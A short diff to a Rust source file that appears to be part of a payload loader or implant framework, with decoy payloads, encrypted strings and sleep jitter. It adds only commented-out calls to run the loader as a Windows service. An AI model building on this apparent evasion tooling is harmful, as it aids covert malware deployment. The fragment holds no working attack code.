@@ -6,6 +6,8 @@ use crate::payload::Payload;
 //use crate::payload_util::print_runonce;
 use crate::payload_util::print_rundata;
 use crate::rundata::RunData;
+//use crate::loader::service_malleable::run_service_malleable;
+//use crate::loader::service_malleable::logservice;
 
 use cryptify;
 use cryptify::encrypt_string;
@@ -89,7 +91,7 @@ pub fn run_loader() {
     let runonce_decoy_update: Vec<Payload> = vec![];
     let running_thread_decoy_payload: Vec<(thread::JoinHandle<()>, Payload)> = vec![];
     let runonce_decoy_payload: Vec<Payload> = vec![];
-
+    
     let mut run_data = RunData {
         running_thread_payload: running_thread_payload,
         runonce_payload: runonce_payload,
@@ -150,6 +152,12 @@ pub fn run_loader() {
         }
 
         print_rundata(&mut run_data);
+
+        //DEBUG sale sur service SCM control
+        //logservice("avant run_service_malleable");
+        //run_service_malleable();
+        //logservice("after run_service_malleable");
+    
 
         //TODO wait all thread to finish -> new option
         config.sleep_and_jitt();
